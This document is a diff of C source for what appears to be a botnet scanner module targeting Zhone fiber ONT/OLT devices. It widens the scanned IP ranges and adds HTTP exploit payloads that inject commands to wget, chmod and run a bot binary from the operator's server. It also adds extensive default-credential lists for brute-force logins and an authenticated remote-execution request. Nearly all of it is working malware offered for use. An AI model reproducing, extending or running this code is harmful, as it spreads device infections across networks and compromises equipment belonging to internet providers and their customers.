@@ -30,10 +30,10 @@ struct zhone_scanner_auth *zhone_auth_table = NULL;
 struct zhone_scanner_connection *conn_table;
 uint16_t zhone_zhone_auth_table_max_weight = 0;
 uint32_t zhone_fake_time = 0;
-int zhone_ranges[] = {189,187,201,190,200,153,180,191,210,177,179,45,103,116,118,72,73,46,47,48,49,50,51,52,58,59,60,61,104,105,106,107,108,109,110,111,112,113,114,115,117,119,120,121,122,123,124,125,175,176,178,181,182,183,184,185,186,188};
+int zhone_ranges[] = {223,222,221,220,219,218,217,213,212,211,210,203,202,201,200,199,198,197,196,195,194,193,192,191,190,189,188,187,186,185,184,183,182,181,180,179,178,177,176,175,174,173,172,171,170,169,168,167,166,165,164,163,162,161,160,159,158,157,156,155,154,153,126,125,124,123,122,121,120,119,118,117,116,115,114,113,112,111,110,109,108,107,106,105,104,103,102,101,95,94,93,92,91,90,89,88,87,86,85,84,83,82,81,80,63,62,61,60,59,58,57,56,55,54,53,52,51,50,49,48,47,46,45,44,43,42,41,40,39,38,37,36,27,14,2,1};
 
 /* Zhone exploit payloads - targets Zhone ONT/OLT devices */
-static char *zhone_payload_cmd = 
+static char *zhone_payload_cmd =
     "POST /cgi-bin/upload.cgi HTTP/1.1\r\n"
     "Host: %d.%d.%d.%d\r\n"
     "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\r\n"
@@ -46,10 +46,92 @@ static char *zhone_payload_cmd =
     "test\r\n"
     "------WebKitFormBoundary--\r\n";
 
-static char *zhone_rce_cmd = 
+static char *zhone_rce_cmd =
     "GET /cgi-bin/execute_cmd.cgi?cmd=cd%%20/tmp%%26%%26wget%%20http://%s/bins/axis.$(uname%%20-m)%%26%%26chmod%%20+x%%20axis.$(uname%%20-m)%%26%%26./axis.$(uname%%20-m)%%20& HTTP/1.1\r\n"
     "Host: %d.%d.%d.%d\r\n"
     "Connection: close\r\n\r\n";
+
+/* Zhone authentication payloads */
+static char *zhone_login_cmd =
+    "POST /login.cgi HTTP/1.1\r\n"
+    "Host: %d.%d.%d.%d\r\n"
+    "Content-Type: application/x-www-form-urlencoded\r\n"
+    "Content-Length: %d\r\n"
+    "Connection: close\r\n"
+    "\r\n"
+    "username=%s&password=%s";
+
+static char *zhone_auth_rce_cmd =
+    "GET /cgi-bin/system_admin.cgi?cmd=wget%%20http://%s/bins/axis.$(uname%%20-m)%%20-O%%20/tmp/z%%26%%26chmod%%20+x%%20/tmp/z%%26%%26/tmp/z& HTTP/1.1\r\n"
+    "Host: %d.%d.%d.%d\r\n"
+    "Cookie: sessionid=%s\r\n"
+    "Connection: close\r\n\r\n";
+
+/* Zhone credential list - comprehensive default passwords */
+static char *zhone_usernames[] = {
+    "admin", "Admin", "root", "user", "support", "operator", "manager", "supervisor",
+    "technician", "service", "guest", "default", "test", "webadmin", "sysadmin",
+    "ontadmin", "oltadmin", "zhone", "zte", "huawei", "fiberhome", "nokia",
+    "alcatel", "calix", "adtran", "tellabs", "isam", "gpon", "epon", "pon",
+    "ftth", "fttp", "onu", "ont", "olt", "mda", "gpon-onu", "vodafone", "adminadmin", NULL
+};
+
+static char *zhone_passwords[] = {
+    /* Common defaults */
+    "admin", "Admin", "password", "123456", "admin123", "root", "1234", "12345",
+    "default", "guest", "user", "support", "operator", "manager", "cciadmin",
+    
+    /* Zhone specific defaults */
+    "zhone", "Zhone", "ZHONE", "ont", "ONT", "gpon", "GPON", "epon", "EPON",
+    "fiber", "Fiber", "admin@zhone", "zhone123", "Zhone123", "admin@ont",
+    "ont123", "ONT123", "gpon123", "GPON123", "fiber123", "Fiber123",
+    
+    /* Vendor defaults */
+    "zte", "ZTE", "zte123", "ZTE123", "huawei", "Huawei", "huawei123",
+    "admin@huawei", "fiberhome", "FiberHome", "fh123", "FH123",
+    "nokia", "Nokia", "nokia123", "alcatel", "Alcatel", "alc123",
+    "calix", "Calix", "calix123", "adtran", "Adtran", "adtran123",
+    "tellabs", "Tellabs", "tellabs123", "isam", "ISAM", "isam123", "vodafone",
+    
+    /* Common patterns */
+    "password123", "Password123", "PASSWORD123", "changeme", "ChangeMe",
+    "letmein", "LetMeIn", "welcome", "Welcome", "welcome123",
+    "qwerty", "QWERTY", "abc123", "ABC123", "pass123", "Pass123",
+    
+    /* Number patterns */
+    "111111", "222222", "333333", "444444", "555555", "666666",
+    "777777", "888888", "999999", "000000", "1111", "2222", "3333",
+    "4444", "5555", "6666", "7777", "8888", "9999", "0000",
+    
+    /* Year patterns */
+    "2020", "2021", "2022", "2023", "2024", "2025", "2026",
+    "20202020", "20212021", "20222022", "20232023", "20242024",
+    
+    /* Regional patterns */
+    "brazil", "Brazil", "china", "China", "india", "India",
+    "vietnam", "Vietnam", "thailand", "Thailand", "indonesia", "Indonesia",
+    "malaysia", "Malaysia", "philippines", "Philippines",
+    "egypt", "Egypt", "iran", "Iran", "turkey", "Turkey",
+    "russia", "Russia", "mexico", "Mexico", "argentina", "Argentina",
+    "colombia", "Colombia", "chile", "Chile", "peru", "Peru",
+    
+    /* FTTH/GPON specific */
+    "ftth123", "FTTH123", "fttp123", "FTTP123", "onu123", "ONU123",
+    "olt123", "OLT123", "mda123", "MDA123", "gpon-onu", "GPON-ONU",
+    "fiberhome123", "broadband", "Broadband", "broadband123",
+    
+    /* ISP common */
+    "isp123", "ISP123", "provider", "Provider", "provider123",
+    "telecom", "Telecom", "telecom123", "carrier", "Carrier",
+    "carrier123", "network", "Network", "network123",
+    
+    /* Additional common */
+    "supervisor", "Supervisor", "supervisor123", "technician", "Technician",
+    "technician123", "service", "Service", "service123", "maintenance",
+    "Maintenance", "maintenance123", "field", "Field", "field123",
+    
+    NULL
+};
 
 int zhone_recv_strip_null(int sock, void *buf, int len, int flags)
 {
@@ -232,7 +314,6 @@ void zhone_scanner_init(void)
                 {
                     if(conn->state == ZHONE_SC_CONNECTING)
                     {
-                        // Connection established - send exploit
                         int err = 0;
                         socklen_t err_len = sizeof(err);
 
@@ -243,7 +324,7 @@ void zhone_scanner_init(void)
                             continue;
                         }
 
-                        // Send Zhone RCE exploit payload
+                        // First try unauthenticated RCE exploit
                         char exploit_cmd[2048];
                         snprintf(exploit_cmd, sizeof(exploit_cmd), zhone_rce_cmd,
                             HTTP_SERVER_IP,
@@ -255,10 +336,11 @@ void zhone_scanner_init(void)
                         send(conn->fd, exploit_cmd, strlen(exploit_cmd), MSG_NOSIGNAL);
                         conn->state = ZHONE_SC_EXPLOIT_STAGE2;
                         conn->last_recv = zhone_fake_time;
+                        conn->auth_attempted = 0;
                     }
                     else if(conn->state == ZHONE_SC_EXPLOIT_STAGE2)
                     {
-                        // Check if exploit worked
+                        // Check if unauthenticated exploit worked
                         if(strstr(conn->rdbuf, "200 OK") != NULL || strstr(conn->rdbuf, "HTTP/1") != NULL)
                         {
                             // Try secondary payload to ensure execution
@@ -273,6 +355,114 @@ void zhone_scanner_init(void)
 
                             send(conn->fd, secondary_cmd, strlen(secondary_cmd), MSG_NOSIGNAL);
                             conn->state = ZHONE_SC_CLOSED;
+                        }
+                        else
+                        {
+                            // Unauthenticated exploit failed, try authentication
+                            conn->state = ZHONE_SC_AUTHENTICATING;
+                            conn->credential_index = 0;
+                            conn->auth_attempted = 0;
+                        }
+                    }
+                    else if(conn->state == ZHONE_SC_AUTHENTICATING)
+                    {
+                        // Try default credentials
+                        if(zhone_usernames[conn->credential_index] == NULL)
+                        {
+                            // No more credentials, close connection
+                            conn->state = ZHONE_SC_CLOSED;
+                            continue;
+                        }
+
+                        char *username = zhone_usernames[conn->credential_index];
+                        char *password = zhone_passwords[conn->credential_index % 150];
+                        
+                        strncpy(conn->current_user, username, sizeof(conn->current_user) - 1);
+                        strncpy(conn->current_pass, password, sizeof(conn->current_pass) - 1);
+
+                        char login_cmd[512];
+                        char post_data[128];
+                        snprintf(post_data, sizeof(post_data), "username=%s&password=%s", username, password);
+                        snprintf(login_cmd, sizeof(login_cmd), zhone_login_cmd,
+                            (conn->dst_addr >> 24) & 0xFF,
+                            (conn->dst_addr >> 16) & 0xFF,
+                            (conn->dst_addr >> 8) & 0xFF,
+                            conn->dst_addr & 0xFF,
+                            strlen(post_data),
+                            username, password);
+
+                        send(conn->fd, login_cmd, strlen(login_cmd), MSG_NOSIGNAL);
+                        conn->state = ZHONE_SC_AUTHENTICATED;
+                        conn->last_recv = zhone_fake_time;
+                    }
+                    else if(conn->state == ZHONE_SC_AUTHENTICATED)
+                    {
+                        // Check for successful login
+                        if(strstr(conn->rdbuf, "200 OK") != NULL || 
+                           strstr(conn->rdbuf, "success") != NULL ||
+                           strstr(conn->rdbuf, "Welcome") != NULL ||
+                           strstr(conn->rdbuf, "dashboard") != NULL ||
+                           strstr(conn->rdbuf, "session") != NULL)
+                        {
+                            // Extract session ID if present
+                            char *session = strstr(conn->rdbuf, "sessionid=");
+                            if(session != NULL)
+                            {
+                                session += 10;
+                                int i = 0;
+                                while(session[i] && session[i] != '"' && session[i] != ';' && session[i] != ' ' && i < 63)
+                                {
+                                    conn->session_id[i] = session[i];
+                                    i++;
+                                }
+                                conn->session_id[i] = '\0';
+                            }
+                            else
+                            {
+                                strcpy(conn->session_id, "default");
+                            }
+
+                            // Send authenticated RCE command
+                            char auth_rce[512];
+                            snprintf(auth_rce, sizeof(auth_rce), zhone_auth_rce_cmd,
+                                HTTP_SERVER_IP,
+                                (conn->dst_addr >> 24) & 0xFF,
+                                (conn->dst_addr >> 16) & 0xFF,
+                                (conn->dst_addr >> 8) & 0xFF,
+                                conn->dst_addr & 0xFF,
+                                conn->session_id);
+
+                            send(conn->fd, auth_rce, strlen(auth_rce), MSG_NOSIGNAL);
+                            conn->state = ZHONE_SC_AUTH_RCE;
+                        }
+                        else if(strstr(conn->rdbuf, "401") != NULL ||
+                                strstr(conn->rdbuf, "403") != NULL ||
+                                strstr(conn->rdbuf, "error") != NULL ||
+                                strstr(conn->rdbuf, "invalid") != NULL ||
+                                strstr(conn->rdbuf, "failed") != NULL)
+                        {
+                            // Login failed, try next credential
+                            conn->credential_index++;
+                            if(conn->credential_index < 150)
+                            {
+                                conn->state = ZHONE_SC_AUTHENTICATING;
+                            }
+                            else
+                            {
+                                conn->state = ZHONE_SC_CLOSED;
+                            }
+                        }
+                        else
+                        {
+                            conn->state = ZHONE_SC_CLOSED;
+                        }
+                    }
+                    else if(conn->state == ZHONE_SC_AUTH_RCE)
+                    {
+                        // Authenticated RCE sent, check for success
+                        if(strstr(conn->rdbuf, "200 OK") != NULL)
+                        {
+                            // Payload should be downloaded and executed
                         }
                         conn->state = ZHONE_SC_CLOSED;
                     }
